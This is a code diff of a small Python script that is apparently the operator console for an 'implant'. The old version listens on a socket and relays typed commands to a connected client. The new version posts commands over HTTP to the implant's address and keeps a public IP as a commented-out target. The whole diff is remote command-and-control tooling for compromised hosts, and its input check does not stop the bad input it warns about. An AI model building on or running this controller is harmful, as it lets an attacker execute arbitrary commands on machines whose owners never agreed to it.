@@ -1,18 +1,18 @@
 #!/usr/bin/env python3
 import socket
 
-s = socket.socket()
-host = "192.168.20.9"  # Get local machine name
-port = 12345  # Reserve a port for your service
-s.bind((host, port))  # Bind to the port
+import requests
 
-s.listen(5)  # Now wait for client connection
-c, addr = s.accept()
+s = socket.socket()
+# host = "18.223.121.137"  # Get local machine name
+host = "127.0.0.1"
+port = 5000  # Reserve a port for your service
 while True:  # Establish connection with client
-    print(f"Connection from {addr} has been established.")
     message = input("Enter command to the implant")
     if message == "exit":
         break
-    c.send(message.encode())
-    print(c.recv(1024))
-c.close()  # Close the connection
+    if " " not in message:
+        print("please input the formate of [command] [post_body] ")
+    command, post_body = message.split(" ", 1)
+    r = requests.post("http://{}:{}/{}".format(host, port, command), data={"parameter": post_body})
+    print(r.content)
